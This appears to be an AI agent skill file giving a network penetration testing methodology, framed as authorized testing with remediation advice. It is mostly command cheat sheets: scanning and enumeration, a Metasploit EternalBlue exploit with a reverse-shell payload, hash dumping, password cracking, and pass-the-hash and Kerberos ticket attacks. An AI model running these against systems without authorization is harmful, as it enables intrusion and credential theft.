---
name: network-penetration-testing
description: Specialized skill and methodology for network penetration testing
version: 1.0.0
---

# Network Penetration Testing

## Overview

Network penetration testing is an important part of assessing the security of network infrastructure. This skill provides methods, tools, and best practices for network penetration testing.

## Testing Scope

### 1. Information Gathering

**Items to check:**
- Network topology
- Host discovery
- Port scanning
- Service identification

### 2. Vulnerability Scanning

**Items to check:**
- System vulnerabilities
- Service vulnerabilities
- Misconfigurations
- Weak passwords

### 3. Exploitation

**Items to check:**
- Remote code execution
- Privilege escalation
- Lateral movement
- Persistence

## Information Gathering

### Network Scanning

**Using Nmap:**
```bash
# Host discovery
nmap -sn 192.168.1.0/24

# Port scanning
nmap -sS -p- 192.168.1.100

# Service identification
nmap -sV -sC 192.168.1.100

# Operating system identification
nmap -O 192.168.1.100

# Full scan
nmap -sS -sV -sC -O -p- 192.168.1.100
```

**Using Masscan:**
```bash
# Fast port scan
masscan -p1-65535 192.168.1.0/24 --rate=1000
```

### Service Enumeration

**SMB enumeration:**
```bash
# Enumerate SMB shares
smbclient -L //192.168.1.100 -N

# Enumerate SMB users
enum4linux -U 192.168.1.100

# Use an nmap script
nmap --script smb-enum-shares,smb-enum-users 192.168.1.100
```

**RPC enumeration:**
```bash
# Enumerate RPC services
rpcclient -U "" -N 192.168.1.100

# Use an nmap script
nmap --script rpc-enum 192.168.1.100
```

**SNMP enumeration:**
```bash
# SNMP scan
snmpwalk -v2c -c public 192.168.1.100

# Use onesixtyone
onesixtyone -c wordlist.txt 192.168.1.0/24
```

## Vulnerability Scanning

### Using Nessus

```bash
# Launch Nessus
# Access the web interface
# Create a scan task
# Analyze the scan results
```

### Using OpenVAS

```bash
# Launch OpenVAS
gvm-setup

# Access the web interface
# Create a scan task
# Analyze the scan results
```

### Using Nmap Scripts

```bash
# Vulnerability scan
nmap --script vuln 192.168.1.100

# Specific vulnerability scan
nmap --script smb-vuln-ms17-010 192.168.1.100

# All scripts
nmap --script all 192.168.1.100
```

## Exploitation

### Metasploit

**Basic usage:**
```bash
# Launch Metasploit
msfconsole

# Search for a vulnerability
search ms17-010

# Use a module
use exploit/windows/smb/ms17_010_eternalblue

# Set parameters
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444

# Execute
exploit
```

**Post-exploitation:**
```bash
# Get system information
sysinfo

# Elevate privileges
getsystem

# Migrate the process
migrate <pid>

# Dump hashes
hashdump

# Get passwords
run post/windows/gather/smart_hashdump
```

### Common Exploits

**EternalBlue:**
```bash
# Using Metasploit
use exploit/windows/smb/ms17_010_eternalblue

# Using a standalone tool
python eternalblue.py 192.168.1.100
```

**BlueKeep:**
```bash
# Using Metasploit
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
```

**SMBGhost:**
```bash
# Using a standalone tool
python smbghost.py 192.168.1.100
```

## Lateral Movement

### Password Cracking

**Using Hashcat:**
```bash
# Crack NTLM hashes
hashcat -m 1000 hashes.txt wordlist.txt

# Crack LM hashes
hashcat -m 3000 hashes.txt wordlist.txt

# Use rules
hashcat -m 1000 hashes.txt wordlist.txt -r rules/best64.rule
```

**Using John:**
```bash
# Crack hashes
john hashes.txt

# Use a wordlist
john --wordlist=wordlist.txt hashes.txt

# Use rules
john --wordlist=wordlist.txt --rules hashes.txt
```

### Pass-the-Hash

**Using Impacket:**
```bash
# SMB Pass-the-Hash
python smbexec.py -hashes :<hash> domain/user@target

# WMI Pass-the-Hash
python wmiexec.py -hashes :<hash> domain/user@target

# RDP Pass-the-Hash
xfreerdp /u:user /pth:<hash> /v:target
```

### Pass-the-Ticket

**Using Mimikatz:**
```bash
# Extract tickets
sekurlsa::tickets /export

# Inject a ticket
kerberos::ptt ticket.kirbi
```

**Using Rubeus:**
```bash
# Request a ticket
Rubeus.exe asktgt /user:user /domain:domain /rc4:hash

# Inject a ticket
Rubeus.exe ptt /ticket:ticket.kirbi
```

## Tool Usage

### Nmap

```bash
# Full scan
nmap -sS -sV -sC -O -p- -T4 target

# Stealth scan
nmap -sS -T2 -f -D RND:10 target

# UDP scan
nmap -sU -p- target
```

### Metasploit

```bash
# Launch the framework
msfconsole

# Initialize the database
msfdb init

# Import scan results
db_import nmap.xml

# View hosts
hosts

# View services
services
```

### Burp Suite

**Network scanning:**
1. Configure the proxy
2. Browse the target network
3. Analyze traffic
4. Active scan

## Testing Checklist

### Information Gathering
- [ ] Network topology discovery
- [ ] Host discovery
- [ ] Port scanning
- [ ] Service identification
- [ ] Operating system identification

### Vulnerability Scanning
- [ ] System vulnerability scan
- [ ] Service vulnerability scan
- [ ] Misconfiguration check
- [ ] Weak password check

### Exploitation
- [ ] Remote code execution
- [ ] Privilege escalation
- [ ] Lateral movement
- [ ] Persistence

## Common Security Issues

### 1. Unpatched Systems

**Problem:**
- System not updated in time
- Known vulnerabilities present
- Poor patch management

**Fix:**
- Install patches promptly
- Establish a patch management process
- Apply regular security updates

### 2. Weak Passwords

**Problem:**
- Default passwords
- Simple passwords
- Password reuse

**Fix:**
- Enforce a strong password policy
- Enable multi-factor authentication
- Change passwords regularly

### 3. Open Ports

**Problem:**
- Unnecessary open ports
- Exposed services
- Firewall misconfiguration

**Fix:**
- Close unnecessary ports
- Enforce firewall rules
- Use VPN access

### 4. Misconfiguration

**Problem:**
- Default configuration
- Excessive privileges
- Improper service configuration

**Fix:**
- Secure configuration baseline
- Principle of least privilege
- Regular configuration review

## Best Practices

### 1. Information Gathering

- Comprehensive scanning
- Cross-validation with multiple tools
- Document findings
- Analyze results

### 2. Exploitation

- Authorized testing
- Minimal impact
- Document actions
- Clean up promptly

### 3. Report Writing

- Detailed records
- Risk rating
- Remediation advice
- Validation steps

## Notes

- Only perform testing in an authorized environment
- Avoid impacting production systems
- Comply with laws and regulations
- Protect test data
